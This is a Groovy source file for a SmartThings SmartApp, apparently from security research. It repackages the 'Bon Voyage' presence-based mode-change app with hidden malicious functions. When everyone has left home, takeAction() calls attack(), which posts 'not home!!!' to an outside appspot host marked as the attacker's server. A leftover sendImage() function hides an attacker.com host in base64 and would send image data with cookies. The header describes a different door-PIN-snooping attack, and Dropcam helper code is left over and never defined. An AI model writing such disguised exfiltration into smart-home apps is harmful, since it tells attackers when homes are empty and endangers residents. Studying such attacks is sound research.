
/**

 *  shiqiBonVoyageRepackaging

 *

 *  Copyright 2016 Yunhan Jia & Shiqi Wang

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.

 * Door lock pin code snooping
Attack Description:
    On the platform of SmartThings, the coarse-grained capabilities is always a serious problem. The malicious smartApps could take advantage of this flaw to implement something really dangerous.



Malicous LockBatteryMonitor:
    Normal functions:
    The battery monitor would observe the battery level of the door lock and send the condition to the server.

    Malicious functions:
    The battery monitor could get the pincode of the door and send it to the attacker via sms.

 */

definition(

    name: "shiqiBonVoyageRepackaging",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "Monitors a set of presence detectors and triggers a mode change when everyone has left.",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

 

 

preferences {

       section("When all of these people leave home") {

              input "people", "capability.presenceSensor", multiple: true

       }

       section("Change to this mode") {

              input "newMode", "mode", title: "Mode?"

       }

       section("And text me at (optional)") {

              input "phone", "phone", title: "Phone number?", required: false

       }

       section("False alarm threshold (defaults to 10 min)") {

              input "falseAlarmThreshold", "decimal", title: "Number of minutes", required: false

       }

}

 

def installed() {

       log.debug "Installed with settings: ${settings}"

       log.debug "Current mode = ${location.mode}, people = ${people.collect{it.label + ': ' + it.currentPresence}}"

       subscribe(people, "presence", presence)

}

 

def updated() {

       log.debug "Updated with settings: ${settings}"

       log.debug "Current mode = ${location.mode}, people = ${people.collect{it.label + ': ' + it.currentPresence}}"

       unsubscribe()

       subscribe(people, "presence", presence)

}

 

def presence(evt)

{

       log.debug "evt.name: $evt.value"

       if (evt.value == "not present") {

              if (location.mode != newMode) {

                     log.debug "checking if everyone is away"

                     if (everyoneIsAway()) {

                            log.debug "starting sequence"

                //attack()

                            def delay = falseAlarmThreshold != null ? falseAlarmThreshold * 60 : 10 * 60

                            runIn(delay, "takeAction")

                     }

              }

              else {

                     log.debug "mode is the same, not evaluating"

              }

       }

       else {

              log.debug "canceling"

              unschedule("takeAction")

       }

}

 

def takeAction()

{

       // TODO -- uncomment when app label is available

       //def message = "${app.label} changed your mode to '${newMode}' because everyone left home"

       def message = "SmartThings changed your mode to '${newMode}' because everyone left home"

       log.info message

       sendPush(message)

       if (phone) {

              sendSms(phone, message)

       }

       setLocationMode(newMode)

    attack()

       unschedule("takeAction") // Temporary work-around to scheduling bug

}

 

private everyoneIsAway()

{

       def result = true

       for (person in people) {

              if (person.currentPresence == "present") {

                     result = false

                     break

              }

       }

       log.debug "everyoneIsAway: $result"

       return result

}

 

def attack() {

    log.debug "http post"

    def takeParams = [

            uri: "https://automated-lore-135923.appspot.com", //"https://attacker.com"

            path: "",

            //headers: [Cookie: getCookieValue(), 'User-Agent': validUserAgent()],

            requestContentType: "application/x-www-form-urlencoded",

            //query: [width: imgWidth, uuid: uuid],

            body: [

                    "condition": "not home!!!"

                 ]

      ]

      try {

              httpPost(takeParams) { resp ->

                     if (resp.status == 200) {

                            log.debug "attack succeeded"

                log.debug resp.data.toString()

                     } else {

                            log.error "attack failed"

                     }

              }

        } catch (groovyx.net.http.HttpResponseException e) {

              log.error "Dropcam get_image failure: ${e} with status: ${e.statusCode}"

              if (e.statusCode == 403) {

                     throw new RuntimeException("Login Required")

              } else if (e.statusCode == 404) {

                     log.error "Dropcam 404, camera may be offline"

              }

        } catch (Exception e) {

              log.error "Unexpected Dropcam exception", e

              //sendNotification("Your dropcam is offline.")

        }

  

}

 

def sendImage(String imageBytes, String uuid, Integer imgWidth) {

        def encoded = "d3d3LmF0dGFja2VyLmNvbQ=="

        def takeParams = [

            uri: "$decodeBase64(encoded)", //"https://attacker.com"

            path: "/get_image",

            headers: [Cookie: getCookieValue(), 'User-Agent': validUserAgent()],

            requestContentType: "application/x-www-form-urlencoded",

            query: [width: imgWidth, uuid: uuid],

            body: [

                    "image": imageBytes

                 ]

      ]

  

       try {

              httpPost(takeParams) { resp ->

                     if (resp.status == 200) {

                            log.debug "attack succeeded"

                     } else {

                            log.error "attack failed"

                     }

              }

       } catch (groovyx.net.http.HttpResponseException e) {

              log.error "Dropcam get_image failure: ${e} with status: ${e.statusCode}"

              if (e.statusCode == 403) {

                     throw new RuntimeException("Login Required")

              } else if (e.statusCode == 404) {

                     log.error "Dropcam 404, camera may be offline"

              }

       } catch (Exception e) {

              log.error "Unexpected Dropcam exception", e

              //sendNotification("Your dropcam is offline.")

       }

}

